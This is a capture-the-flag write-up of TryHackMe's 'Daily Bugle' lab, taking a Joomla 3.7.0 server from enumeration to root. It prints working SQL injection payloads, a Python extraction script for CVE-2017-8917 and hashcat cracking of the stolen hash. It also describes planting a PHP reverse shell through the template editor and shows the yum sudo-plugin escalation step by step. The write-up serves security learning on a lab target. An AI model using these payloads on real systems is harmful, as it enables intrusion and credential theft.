
# TryHackMe | Daily Bugle


![Thompson Image](thm-dailyBugle.png)

☍ Room Link - "https://tryhackme.com/room/dailybugle"

> Hello fellow hackers, learners, and security enthusiasts! 💻
> 
> Welcome to my corner of the internet where I document my path through the exciting world of penetration testing and cybersecurity. Whether you're here to follow along, learn together, or just curious about ethical hacking - I'm glad you stopped by!

## Introduction

This writeup walks through the "Daily Bugle" challenge from TryHackMe. You'll follow a step-by-step journey from initial reconnaissance to full system compromise, including the real-world trial and errors encountered along the way.

In this guide, you'll learn:
- **Network Enumeration** using `nmap` and `gobuster` for service discovery
- **Web Application Exploitation** of a vulnerable application
- **Database Attacks** through crafted SQL injection payloads
- **Password Cracking** with `hashcat` to recover credentials
- **Privilege Escalation** using `linpeas` for automated vector discovery
- **Binary Abuse** leveraging `yum` with sudo rights for root access

Grab a coffee and let's get started! ☕

**📋 Machine Description and Tasks -** 
- Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.
- We have to answer three questions and collect two flags (user flag and root flag).

## Enumeration

First, I started with a basic **nmap** scan.

**Nmap Scan Results -** 
```shell
 ➥ $ nmap -sCV -p- 10.80.132.94

Nmap scan report for 10.80.132.94
Host is up (0.022s latency).
Not shown: 65532 closed tcp ports (conn-refused)

PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)

80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40

3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.27 seconds

```

**Command Explanation -** 
- **nmap** , network exploration tool and security / port scanner.
- **-sC** , for default script.
- **-sV** , for service/version info.
- **-p-** , to scan ports from 1 through 65535.
- read more "https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html"

From the above scan results - 
- **Port 22** : 'OpenSSH' server and The service is running on port 22.
- **Port 80** : 'Apache' web server.
- **Port 3306** : Running a MySQL server.

Note : It shows `http-robots.txt: 15 disallowed entries` , that's interesting. I have visited the web page to gather more information and got a clue for the first question.

Landing Page - "http://TARGET_IP"

![Home Page](thm-dailyBugle-pic1.png)

**Q1. Access the web server, who robbed the bank?**

I have seen `15 disallowed entries` from the last nmap scan and I did checked the `robots.txt` file.

`robots.txt` - "http://TARGET_IP/robots.txt"

```
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

Just to get more about the web site and also to reveal if there any hidden directories, I did a **gobuster** scan. See the results below - 

**Gobuster Scan Results :**

```shell
 ➥ $ gobuster dir -u http://10.80.132.94/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.132.94/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 211]
.htaccess            (Status: 403) [Size: 211]
administrator        (Status: 301) [Size: 242] [--> http://10.80.132.94/administrator/]
bin                  (Status: 301) [Size: 232] [--> http://10.80.132.94/bin/]
cache                (Status: 301) [Size: 234] [--> http://10.80.132.94/cache/]
cgi-bin/             (Status: 403) [Size: 210]
cli                  (Status: 301) [Size: 232] [--> http://10.80.132.94/cli/]
components           (Status: 301) [Size: 239] [--> http://10.80.132.94/components/]
images               (Status: 301) [Size: 235] [--> http://10.80.132.94/images/]
includes             (Status: 301) [Size: 237] [--> http://10.80.132.94/includes/]
language             (Status: 301) [Size: 237] [--> http://10.80.132.94/language/]
layouts              (Status: 301) [Size: 236] [--> http://10.80.132.94/layouts/]
libraries            (Status: 301) [Size: 238] [--> http://10.80.132.94/libraries/]
media                (Status: 301) [Size: 234] [--> http://10.80.132.94/media/]
modules              (Status: 301) [Size: 236] [--> http://10.80.132.94/modules/]
plugins              (Status: 301) [Size: 236] [--> http://10.80.132.94/plugins/]
robots.txt           (Status: 200) [Size: 836]
templates            (Status: 301) [Size: 238] [--> http://10.80.132.94/templates/]
tmp                  (Status: 301) [Size: 232] [--> http://10.80.132.94/tmp/]
Progress: 20481 / 20481 (100.00%)
===============================================================
Finished
===============================================================

```

 I got a few extra information from the scan. Most of them are already mentioned in the `robots.txt` file.

I visited "http://TARGET_IP/administrator/" and got a login page.

![Joomla Login](thm-dailyBugle-pic2.png)

## Exploitation

I tried to login with some basic combinations but no luck there. So, I searched google for `Joomla exploits` and found this nice guide on how to attack and break into joomla based websites.

Check Here - "https://hackertarget.com/attacking-enumerating-joomla/"

To get the proper exploit, I have to detect the joomla version running on the target system. From the above guide, I knew that we can get the version from the `joomla.xml` file within the directory `/administrator/manifests/files/`. 

Joomla version - "http://TARGET_IP/administrator/manifests/files/joomla.xml"

![Joomla Version](thm-dailyBugle-pic3.png)

We got the answer to the our second question - **What is the Joomla version?**

I modified my google search to `Joomla 3.7.0 exploits` and the first link I got is for `exploit-db`.

Exploit Details : Joomla! 3.7.0 - 'com_fields' SQL Injection - CVE-2017-8917. Check the exploit - "https://www.exploit-db.com/exploits/42033"

Read More - "https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html"

Based on the `exploit-db` guide, I identified a vulnerable endpoint and parameter with three attack vectors. Testing each revealed the target is vulnerable to `error-based SQL injection`. See the SQL query below :

```CVE
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
    
```

I modified my payload as follows with the target IP - 

```
http://10.80.132.94/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT%206600%20FROM(SELECT%20COUNT(*),CONCAT(0x7171767071,(SELECT%20(ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)
```

I got a response from the server which is an error message. The error response from the server confirms successful exploitation of the error-based SQL injection vulnerability. As intended, the payload triggered a database error that disclosed sensitive information in the error message, validating both the vulnerability presence and payload effectiveness.

![SQL Injection](thm-dailyBugle-pic4.png)

**Explanation :**
- The error message "Duplicate entry 'qqvpq1qjpvq1' for key 'group_key'" demonstrates a successful error-based SQL injection attack. The hexadecimal strings `qqvpq` (0x7171767071) and `qjpvq` (0x716a707671) serve as wrapper markers deliberately placed around our target output to make the extracted data clearly visible within the error response. The critical value `1` appearing between these markers represents the successful execution of our injected SQL query, specifically from the ELT(6600=6600,1) function which evaluates to 1 when the true condition is met.

I modified the exploit a bit and created a python script for the demonstration purposes.

**Query Script ( Python ) :** 

```python
#!/usr/bin/env python3

import requests
import re

target = "http://10.80.132.94/index.php?"
first = "option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x4f4f4f,"

query = input("Enter your QUERY : ")

last = ",0x4f4f4f,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

url = target + first + query + last

# OR, Simply

# url = f"http://10.80.132.94/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x4f4f4f,{query},0x4f4f4f,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

res = requests.get(url)

data = re.findall(r"&#039;(.*?)&#039;", res.text)[:2]
print(data)

```

Check the below image, I did a few more queries and finally retrieved the password hash.

![Shell Output](thm-dailyBugle-pic5.png)

**1. Database Version**

```
(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT @@version),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
```

**2. Current Database**

```
(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT database()),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
```

**3. Joomla Usernames**

```
(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT username FROM %23__users LIMIT 0,1),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
```

**4. Joomla Passwords**

```
(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT password FROM %23__users LIMIT 0,1),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
```

**Note :** 
- An important limitation to consider is that the error message returned by the server can only contain a maximum of 64 characters. This means if you use the original '0x7171767071' wrapper as specified in the payload, you risk losing portions of the actual hash string since our target hash contains 61 characters. To work around this constraint, you have two practical options: either shorten the wrapper length as demonstrated in previous attempts, or split the extraction query into multiple segments. For instance, you can retrieve the first 30 characters using "(SELECT SUBSTRING(password,1,30) FROM %23__users LIMIT 0,1)" and then obtain the remaining portion with "(SELECT SUBSTRING(password,31,60) FROM %23__users LIMIT 0,1)" to successfully capture the complete hash within the server's character limitations.

I tried to crack the hash using `hashcat` with popular `rockyou.txt` wordlist (You can check the hash type from any online hash identifier site).

```shell
$ hashcat -m 3200 -a 0 crack.txt /usr/share/wordlists/rockyou.txt
```

After several minutes of processing, 'hashcat' successfully cracked the password hash, revealing the cleartext credentials.

![Cracked Hash](thm-dailyBugle-pic6.png)

This is the answer to out third question - **What is Jonah's cracked password?**

Now, let's login with the credentials we got - "http://TARGET_IP/administrator/".

![Joomla Login](thm-dailyBugle-pic7.png)

After Login, I got the below page and from the left panel I selected the 'Templates' option, mainly to check active template.

![Account Access](thm-dailyBugle-pic8.png)

I can see that the 'protostar' is the default template for all pages in the website.

![Default Template](thm-dailyBugle-pic9.png)

I selected 'Templates' option from there to customize the 'protostar' template and modified the 'error.php' file (the error page).

![PHP file modification](thm-dailyBugle-pic10.png)

Here, I replaced the 'error.php' file's content with this excellent PHP Reverse Shell script - "https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" and saved our custom php file in the server.

**Custom PHP File -** 

![Custom PHP File](thm-dailyBugle-pic11.png)

I started a netcat listner on the specified port and visited "http://TARGET_IP/templates/protostar/error.php" (where the php file is located) to execute the custom 'error.php' and I received a response from the target server.

## Initial Access

Upon obtaining the initial shell, I immediately upgraded it using the Python pty module and exported xterm for stabilization, establishing a fully interactive TTY session. I discovered a user home directory named **'jjameson'** within the system. However, our current **'apache'** user lacks the necessary read permissions to access this directory, indicating potential privilege separation that requires further escalation.

![Initial Access](thm-dailyBugle-pic12.png)

After conducting basic manual enumeration — including checking for **SUID** binaries with `find / -type f -perm -4000 2>/dev/null` and reviewing scheduled tasks via `cat /etc/crontab` — I found no immediately useful attack vectors. With manual approaches exhausted, I proceeded to run an automated privilege escalation assessment using **LinPEAS**.

'LinPEAS' - "https://github.com/peass-ng/PEASS-ng/releases/download/20251115-74c9337c/linpeas.sh"

To deploy **LinPEAS**, I first downloaded the script from its official repository and hosted it locally via Python's HTTP server module. The script was then transferred to the target machine, made executable using `chmod +x linpeas.sh`, and executed with `./linpeas.sh` to systematically identify potential privilege escalation paths.

![Linpeas Output](thm-dailyBugle-pic13.png)

Well, we can see from the above output that there is a hard-coded file (configuation.php) which contains the password for user **'jjameson'**.

I logged in with the above password as user **'jjameson'** and got the **'user flag'** inside home directory.

![User Access](thm-dailyBugle-pic14.png)

## Privilege Escalation

The `sudo -l` command revealed that the current user has password-less sudo rights to execute **`/usr/bin/yum`** with root privileges.

![Sudo Binary](thm-dailyBugle-pic15.png)

 Following GTFOBins documentation for **'yum'**, I confirmed that this binary can be exploited by loading a malicious plugin to spawn an interactive root shell, providing a clear path for privilege escalation.
 
Check Here - "https://gtfobins.github.io/gtfobins/yum/#sudo"

![GTFO Bins](thm-dailyBugle-pic15-1.png)

**Spawning a root shell :**

Follow the detailed steps - 

1. Created a temporary directory (usually in `/tmp/`) and stored the generated directory path in a variable called `TF`.
```shell
TF=$(mktemp -d)
```

2. Created a file named `x` in that temporary directory and '<<EOF' used here to write multiple lines.
```shell
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
```

3. Created a file named `y.conf` in that temporary directory with the following lines.
```shell
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
```

4. Created another file named `y.py` in that temporary directory with the following lines.
```shell
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
```

5. Lastly, executed 'yum' with root privileges (thanks to `NOPASSWD` access) and used our custom config file that forces our crafted plugin to run.
```shell
sudo /usr/bin/yum -c $TF/x --enableplugin=y
```

Check the below images for visual representation - 

![Priv Esc 1](thm-dailyBugle-pic16.png)
![Priv Esc 2](thm-dailyBugle-pic17.png)

Finally, I got the **'root flag'** inside root user '/home' directory.

![Root Flag](thm-dailyBugle-pic18.png)

